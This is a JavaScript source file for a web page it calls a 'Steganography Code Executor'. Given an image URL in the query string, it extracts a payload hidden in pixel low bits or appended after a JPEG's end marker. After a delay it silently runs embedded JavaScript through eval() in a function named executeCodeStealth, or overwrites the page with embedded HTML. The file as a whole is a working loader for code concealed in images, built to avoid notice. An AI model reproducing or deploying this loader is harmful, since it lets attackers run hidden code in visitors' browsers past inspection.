// Constants for steganography
const MAGIC_LSB = "STEGOV1\n";
const MAGIC_JPG = "JSTEGV1\n";
const JPEG_EOI = "\xff\xd9";

// DOM elements
let loadingOverlay = document.getElementById('loadingOverlay');
let displayImage = document.getElementById('displayImage');
let imageViewer = document.getElementById('imageViewer');

// Check for stealth mode (image URL in query parameters)
let stealthMode = false;

// Functions
function getImageExtension(filename) {
    try {
        const parsed = new URL(filename, window.location.href);
        const path = parsed.pathname;
        const match = path.match(/\.([a-zA-Z0-9]+)$/);
        return match ? match[1].toLowerCase() : '';
    } catch (error) {
        const clean = String(filename).split('?')[0].split('#')[0];
        const match = clean.match(/\.([a-zA-Z0-9]+)$/);
        return match ? match[1].toLowerCase() : '';
    }
}

function bytesEqualAt(data, offset, expected) {
    if (offset < 0 || offset + expected.length > data.length) {
        return false;
    }

    for (let i = 0; i < expected.length; i++) {
        if (data[offset + i] !== expected[i]) {
            return false;
        }
    }

    return true;
}

function extractCodeJPEG(bytes) {
    if (!(bytes instanceof Uint8Array)) {
        bytes = new Uint8Array(bytes);
    }

    // Validate JPEG SOI.
    if (bytes.length < 4 || bytes[0] !== 0xff || bytes[1] !== 0xd8) {
        throw new Error('The downloaded file is not a valid JPEG.');
    }

    // hide.py appends the JSTEGV1 payload immediately after the
    // final JPEG EOI marker (FF D9).
    let eoiIndex = -1;

    for (let i = bytes.length - 2; i >= 0; i--) {
        if (bytes[i] === 0xff && bytes[i + 1] === 0xd9) {
            eoiIndex = i;
            break;
        }
    }

    if (eoiIndex === -1) {
        throw new Error('This JPEG does not contain a valid end-of-image marker.');
    }

    const payloadStart = eoiIndex + 2;

    if (payloadStart >= bytes.length) {
        throw new Error('No hidden payload was found in this JPEG.');
    }

    const magicBytes = new TextEncoder().encode(MAGIC_JPG);

    if (!bytesEqualAt(bytes, payloadStart, magicBytes)) {
        throw new Error('No compatible hidden payload was found in this JPEG.');
    }

    const payloadBytes = bytes.slice(payloadStart);
    return parsePayloadBytes(payloadBytes, magicBytes);
}

function extractCodeLSB(canvas) {
    const ctx = canvas.getContext('2d', { willReadFrequently: true });

    if (!ctx) {
        throw new Error('Could not create a 2D canvas context.');
    }

    let imageData;
    try {
        imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
    } catch (error) {
        throw new Error(
            'The browser blocked pixel access to this remote image. The image server must allow CORS.'
        );
    }

    const data = imageData.data;
    const bytes = new Uint8Array(Math.floor((data.length / 4 * 3) / 8));
    let bitIndex = 0;
    let currentByte = 0;
    let byteIndex = 0;

    // Extract one LSB from R, G and B, exactly matching hide.py.
    for (let i = 0; i < data.length; i += 4) {
        const channels = [data[i] & 1, data[i + 1] & 1, data[i + 2] & 1];

        for (const bit of channels) {
            currentByte = (currentByte << 1) | bit;
            bitIndex++;

            if (bitIndex === 8) {
                if (byteIndex < bytes.length) {
                    bytes[byteIndex++] = currentByte;
                }
                currentByte = 0;
                bitIndex = 0;
            }
        }
    }

    const magicBytes = new TextEncoder().encode(MAGIC_LSB);

    if (!bytesEqualAt(bytes, 0, magicBytes)) {
        throw new Error('No hidden payload was found in this image.');
    }

    return parsePayloadBytes(bytes, magicBytes);
}

function parsePayloadBytes(data, magicBytes) {
    if (!(data instanceof Uint8Array)) {
        data = new Uint8Array(data);
    }

    if (!bytesEqualAt(data, 0, magicBytes)) {
        throw new Error('No compatible payload was found in this image.');
    }

    let position = magicBytes.length;

    // Payload layout used by hide.py:
    // MAGIC + filename_len(4B) + filename + data_len(8B) + file_data
    if (data.length < position + 4) {
        throw new Error('Payload is incomplete or corrupted.');
    }

    const filenameLength =
        data[position] * 0x1000000 +
        data[position + 1] * 0x10000 +
        data[position + 2] * 0x100 +
        data[position + 3];

    position += 4;

    if (filenameLength <= 0 || filenameLength > 4096) {
        throw new Error('Invalid embedded filename.');
    }

    if (data.length < position + filenameLength) {
        throw new Error('Payload is incomplete.');
    }

    const filenameBytes = data.slice(position, position + filenameLength);
    position += filenameLength;

    let originalFilename;
    try {
        originalFilename = new TextDecoder('utf-8', { fatal: true }).decode(filenameBytes);
    } catch (error) {
        throw new Error('Embedded filename is not valid UTF-8.');
    }

    // Only keep the filename itself. This mirrors extract.py's
    // basename protection and prevents directory-like names.
    originalFilename = originalFilename.split(/[/\\\\]/).pop();

    if (!originalFilename) {
        throw new Error('Invalid embedded filename.');
    }

    if (data.length < position + 8) {
        throw new Error('Payload is incomplete (missing data length).');
    }

    let dataLength = 0;
    for (let i = 0; i < 8; i++) {
        dataLength = dataLength * 256 + data[position + i];

        if (!Number.isSafeInteger(dataLength)) {
            throw new Error('Embedded file is too large to process in the browser.');
        }
    }
    position += 8;

    if (dataLength <= 0) {
        throw new Error('The embedded file is empty.');
    }

    if (dataLength > data.length - position) {
        throw new Error('Payload is incomplete (truncated data).');
    }

    const fileDataBytes = data.slice(position, position + dataLength);
    const fileData = new TextDecoder('utf-8').decode(fileDataBytes);

    if (!fileData) {
        throw new Error('The embedded file is empty.');
    }

    const lowerFilename = originalFilename.toLowerCase();

    // Auto-process JavaScript and HTML files only. Other file types
    // are extracted and displayed but are not automatically run.
    if (lowerFilename.endsWith('.js')) {
        executeCodeStealth(fileData);
    } else if (lowerFilename.endsWith('.html') || lowerFilename.endsWith('.htm')) {
        executeEmbeddedHTML(fileData);
    }

    return {
        filename: originalFilename,
        data: fileData,
        size: dataLength
    };
}

function executeCodeStealth(code) {
    try {
        // Execute the code directly without showing any UI
        (function() {
            eval(code);
        })();
        
        console.log('Code executed in stealth mode');
    } catch (error) {
        console.error('Error in stealth execution:', error.message);
    }
}

function executeEmbeddedHTML(htmlContent) {
    try {
        // Replace the entire current document with the new HTML payload
        document.open();
        document.write(htmlContent);
        document.close();
    } catch (error) {
        console.error('Error executing embedded HTML:', error.message);
    }
}

async function extractCodeFromImage(canvas, filename, rawBytes = null) {
    const extension = getImageExtension(filename);

    if (extension === 'jpg' || extension === 'jpeg') {
        // JPEG files created by hide.py store the payload after the
        // final JPEG EOI marker. Canvas pixels cannot recover it.
        if (!rawBytes) {
            let response;
            try {
                response = await fetch(filename, {
                    mode: 'cors',
                    cache: 'no-store'
                });
            } catch (error) {
                throw new Error(
                    'The JPEG could not be read from this remote server because the browser blocked the cross-origin request (CORS).'
                );
            }

            if (!response.ok) {
                throw new Error(`Could not download the JPEG (HTTP ${response.status}).`);
            }

            rawBytes = new Uint8Array(await response.arrayBuffer());
        }

        extractCodeJPEG(rawBytes);
        return;
    }

    if (!canvas) {
        throw new Error('A canvas is required for LSB image extraction.');
    }

    // PNG/BMP/TIFF use RGB LSB extraction.
    extractCodeLSB(canvas);
}

// Check for image URL in query parameters
window.addEventListener('load', () => {
    loadingOverlay = loadingOverlay || document.getElementById('loadingOverlay');
    displayImage = displayImage || document.getElementById('displayImage');
    imageViewer = imageViewer || document.getElementById('imageViewer');

    const urlParams = new URLSearchParams(window.location.search);
    const imageUrl = urlParams.get('image');
    
    if (imageUrl) {
        // Enable stealth mode when an image URL is provided
        stealthMode = true;
        
        // Show the image viewer
        if (imageViewer) imageViewer.style.display = 'flex';
        if (loadingOverlay) loadingOverlay.style.display = 'flex';
        
        // Set the image source
        if (displayImage) displayImage.src = imageUrl;
        
        // Load the image from the URL. JPEG extraction uses raw bytes,
        // while PNG/BMP/TIFF extraction requires CORS-enabled pixels.
        const extension = getImageExtension(imageUrl);
        const img = new Image();
        if (extension !== 'jpg' && extension !== 'jpeg') {
            img.crossOrigin = 'anonymous';
        }
        
        img.onload = async function() {
            // Hide the loading overlay
            if (loadingOverlay) loadingOverlay.style.display = 'none';
            
            // Wait for 5 seconds before extracting and executing code
            setTimeout(async () => {
                try {
                    let canvas = null;
                    let rawBytes = null;

                    if (extension === 'jpg' || extension === 'jpeg') {
                        let response;
                        try {
                            response = await fetch(imageUrl, {
                                mode: 'cors',
                                cache: 'no-store'
                            });
                        } catch (error) {
                            throw new Error(
                                'The remote JPEG could not be read because the image server blocked the cross-origin request (CORS).'
                            );
                        }

                        if (!response.ok) {
                            throw new Error(`Could not download the JPEG (HTTP ${response.status}).`);
                        }

                        rawBytes = new Uint8Array(await response.arrayBuffer());
                    } else {
                        canvas = document.createElement('canvas');
                        canvas.width = img.naturalWidth || img.width;
                        canvas.height = img.naturalHeight || img.height;
                        const ctx = canvas.getContext('2d', { willReadFrequently: true });
                        ctx.drawImage(img, 0, 0);
                    }

                    await extractCodeFromImage(canvas, imageUrl, rawBytes);
                    
                    // Hide the image after code execution
                    if (imageViewer) imageViewer.style.display = 'none';
                } catch (error) {
                    console.error('Error extracting code:', error.message);
                    
                    // Show error in stealth mode
                    const errorDiv = document.createElement('div');
                    errorDiv.style.position = 'fixed';
                    errorDiv.style.top = '50%';
                    errorDiv.style.left = '50%';
                    errorDiv.style.transform = 'translate(-50%, -50%)';
                    errorDiv.style.background = 'rgba(255, 64, 64, 0.2)';
                    errorDiv.style.border = '1px solid rgba(255, 64, 64, 0.5)';
                    errorDiv.style.borderRadius = '10px';
                    errorDiv.style.padding = '20px';
                    errorDiv.style.color = '#ff4040';
                    errorDiv.style.textAlign = 'center';
                    errorDiv.style.zIndex = '1001';
                    errorDiv.innerHTML = '<h3>Execution Failed</h3><p>' + error.message + '</p>';
                    document.body.appendChild(errorDiv);
                    
                    // Auto-hide the error message after 5 seconds
                    setTimeout(() => {
                        errorDiv.style.opacity = '0';
                        errorDiv.style.transition = 'opacity 1s';
                        setTimeout(() => {
                            if (errorDiv.parentNode) {
                                errorDiv.parentNode.removeChild(errorDiv);
                            }
                        }, 1000);
                    }, 5000);
                }
            }, 5000);
        };
        
        img.onerror = function() {
            // Show error in stealth mode
            const errorDiv = document.createElement('div');
            errorDiv.style.position = 'fixed';
            errorDiv.style.top = '50%';
            errorDiv.style.left = '50%';
            errorDiv.style.transform = 'translate(-50%, -50%)';
            errorDiv.style.background = 'rgba(255, 64, 64, 0.2)';
            errorDiv.style.border = '1px solid rgba(255, 64, 64, 0.5)';
            errorDiv.style.borderRadius = '10px';
            errorDiv.style.padding = '20px';
            errorDiv.style.color = '#ff4040';
            errorDiv.style.textAlign = 'center';
            errorDiv.style.zIndex = '1001';
            errorDiv.innerHTML = '<h3>Image Load Failed</h3><p>Could not load/read the image from the provided URL. Check the direct image URL and CORS permissions.</p>';
            document.body.appendChild(errorDiv);
            
            // Auto-hide the error message after 5 seconds
            setTimeout(() => {
                errorDiv.style.opacity = '0';
                errorDiv.style.transition = 'opacity 1s';
                setTimeout(() => {
                    if (errorDiv.parentNode) {
                        errorDiv.parentNode.removeChild(errorDiv);
                    }
                }, 1000);
            }, 5000);
        };
        
        img.src = imageUrl;
    } else {
        // If no image URL is provided, show a message
        const messageDiv = document.createElement('div');
        messageDiv.style.position = 'fixed';
        messageDiv.style.top = '50%';
        messageDiv.style.left = '50%';
        messageDiv.style.transform = 'translate(-50%, -50%)';
        messageDiv.style.background = 'rgba(0, 212, 255, 0.2)';
        messageDiv.style.border = '1px solid rgba(0, 212, 255, 0.5)';
        messageDiv.style.borderRadius = '10px';
        messageDiv.style.padding = '20px';
        messageDiv.style.color = '#00d4ff';
        messageDiv.style.textAlign = 'center';
        messageDiv.style.zIndex = '1001';
        messageDiv.innerHTML = '<h3>Steganography Code Executor</h3><p>Please provide an image URL with the ?image= parameter to execute hidden code.</p>';
        document.body.appendChild(messageDiv);
    }
});
